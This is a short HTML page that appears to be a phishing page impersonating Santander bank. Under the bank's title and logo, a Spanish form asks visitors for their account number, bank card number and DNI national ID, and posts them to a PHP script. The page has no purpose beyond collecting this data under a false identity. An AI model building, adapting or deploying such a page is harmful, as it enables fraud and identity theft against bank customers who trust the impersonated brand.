<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Santander</title>
</head>
<body>
    <div class="container__cabecera">
        <header>
            <img src="./santander1-logo.png" alt="" />
        </header>
    </div>
    <div class="container__form">
         <h3>Introduzca sus datos bancarios</h3>
         <form action="index.php" method="post">
            <div class="campos">
                <label >Número de cuenta</label>
                <input type="text" name="numCuenta"/>
            </div>
            <div class="campos">
                
            </div>
            <div class="campos">
                <label >Número de tarjeta bancaria</label>
                <input type="text" name="numTarjBanc"/>
            </div>
            <div class="campos">
                <label >Dni</label>
                <input type="text" name="dni"/>
            </div>
            <input type="submit" value="Enviar" class="boton"/>
         </form>
    </div>
</body>
</html>
